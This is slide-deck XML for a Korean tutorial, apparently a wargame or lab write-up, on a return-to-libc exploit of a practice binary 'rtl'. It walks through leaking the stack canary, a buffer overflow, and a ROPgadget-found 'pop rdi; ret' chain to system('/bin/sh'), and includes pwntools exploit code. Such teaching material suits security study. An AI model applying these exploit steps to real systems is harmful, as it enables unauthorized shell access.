            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .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rodata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섹션에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>”  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열이 존재합니다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rdi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인자에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 주소를 넣기 위해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가젯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 함수를 삽입하였습니다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(pop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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, ret)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="12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목표는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 인자로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system@PLT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간접 호출을 통해 쉘을 실행 시키겠습니다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마찬가지로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>read</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>사이즈를 초과하여 입력을 받기 때문에 버퍼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오버플로우로</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 인해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>변조가 가능합니다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897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000A-E272-2018-FA14-C069093F5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DA23962-A0C6-DEC7-09B2-57F8FE4073AA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AF20C-8B4E-BCF0-DBC4-416F5807FD3F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F266E2-6426-69AA-E51E-D64AFE90A775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09D65-3803-21CD-4027-B88ADA090541}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2027663"/>
            <a:ext cx="2820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CA522A-3F3E-9A54-6E4A-1335EFD52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71" y="1632375"/>
            <a:ext cx="3905250" cy="7905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784FB6-8AE3-43B0-22CA-640076B61B35}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178360" y="1658331"/>
            <a:ext cx="30803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프로그램 실행 시 문자열이 출력되는데 이는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system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함수를 통해 출력된 문자열 입니다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B6C6CA2-BEFC-CA2D-B242-CDA8F8CB2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71" y="2786523"/>
            <a:ext cx="4711923" cy="17379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2F627BB-0B51-3143-245F-A3D8EDB5F3A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178359" y="3286143"/>
            <a:ext cx="30803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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, system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함수가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PLT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>섹션에 등록되어 있으며 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GOT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에는 실제 라이브러리의 주소가 적혀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7CDBAEF-C38A-7329-5385-6CEF43670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371" y="5123988"/>
            <a:ext cx="3943350" cy="11049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ADD4E5-49F5-4430-94AA-3B1610F99C86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178358" y="5414828"/>
            <a:ext cx="3245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이후</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>첫 번째 입력은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입력값을</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 출력해주고 두번째 입력을 받고 프로그램은 종료됩니다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314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EBAAF-B4AE-2DB3-2AEB-DD52216E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0DCA5B6-E418-AC16-9715-D7B4C61E49AD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1EA2AC-13DC-8E97-E22A-2EC32879D837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AC5BB-4A66-B238-9C87-EEF160A4D0B9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713467-7CD6-CEEE-E621-F2CFEC557717}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="116680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우선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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 값 유출</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(leak) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>부터  하겠습니다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2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첫 번째 입력인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>read </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 까지 입력 값을 이어준 후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printf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에서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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 값을 얻습니다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4C2F8E4-3AE9-404B-D5D1-D05ECD627885}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="434415" y="2414434"/>
            <a:ext cx="5835756" cy="35596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from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pwn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> import *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io = process("./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>")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elf = ELF("./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>")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def slog(name, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>):		// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값과 주소 출력 함수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return success(" : ".join([name, hex(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)]))</a:t>
            </a:r>
          </a:p>
          <a:p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# Leak Canary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payload1 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b"A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>" * 0x48 	// canary </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>까지 버퍼 채우기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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.sendline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvuntil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload1)		// payload1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>만큼 받기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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(1)			// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sendline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이므로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>개행</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 문자 받기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canary = u64(b”\x00" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(7))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>// byte </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>형태의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 출력 값을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>형으로 변환하여 저장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slog(“canary＂, canary)  	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 출력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D4B0EE-51BE-42C1-A18B-C6F38ADD7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802" y="3964305"/>
            <a:ext cx="3981450" cy="20097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B6BC8E7-2962-14A9-3D5E-E6742A01A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802" y="2447091"/>
            <a:ext cx="456247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2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E56D-183E-DF53-D104-3CF0B069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93DABB4-4A47-A584-D0D6-FC98A3768B7C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0AF97-7198-86CC-FDFE-178BBDD70DF5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62B0B-4758-55AD-8841-06A886EC55AE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EA6C19-B01F-BF79-9C86-C61F1552D74D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1342349"/>
            <a:ext cx="11668034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두번째 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>read </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>입력 때 최종 페이로드를 보내줍니다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 buffer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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+ canary + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>rbp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 + ret(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>system@PLT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)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system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함수는 인자로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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 레지스터에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>실행할 명령</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 문자열의 주소를 받기 때문에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 주소를 넣어줘야 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 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 system(“/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/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  <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>”)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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따라서</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret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system@plt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전에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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열의 주소 를 가리키고 있어야 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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>그러므로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“pop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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령어 조각</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(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가젯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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이 필요합니다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18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ROPgadget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툴을 사용해서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gadget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함수에 존재하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“pop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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; ret” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령어 조각의 주소를 찾아줍니다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79721B5-82B4-1059-B1B0-A5376DC56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994" y="3719512"/>
            <a:ext cx="6477000" cy="1266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7CD82A1-6AE6-474E-47B8-84CBE9823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34" y="3489960"/>
            <a:ext cx="4686300" cy="18478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1958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5B15C-122F-9D5C-F44D-16AF5F69F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F805C74-0563-E7CB-5801-6D7A32F4F854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2FEAA-0292-46FB-5FAC-AEC7A252EBA6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EF5C21-A166-6AC9-F686-3CA9C8CB4D15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8A660-5259-8CB4-E8BB-B0AF27BD181F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1342349"/>
            <a:ext cx="1166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이제 필요한 정보는 다 모았습니다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95E73B-54E6-B58D-C0FA-DA9DE7880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58" y="2718980"/>
            <a:ext cx="2600325" cy="11239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B9E0012-BAE1-C084-D89E-43C6EC91A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511" y="2871380"/>
            <a:ext cx="4953000" cy="8191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94D4FE9-3649-D033-7680-57FC5A568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187" y="4710793"/>
            <a:ext cx="6362700" cy="11811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ACCA62-3BA9-009B-1930-4284F84DDD0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1895885" y="2339916"/>
            <a:ext cx="1489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en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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주소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5137E8-77A5-9174-D43A-20EDB43970AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293497" y="2411203"/>
            <a:ext cx="1676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“/bin/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</a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 주소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084465-4DBA-14C6-625E-E1980737A848}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125010" y="4332275"/>
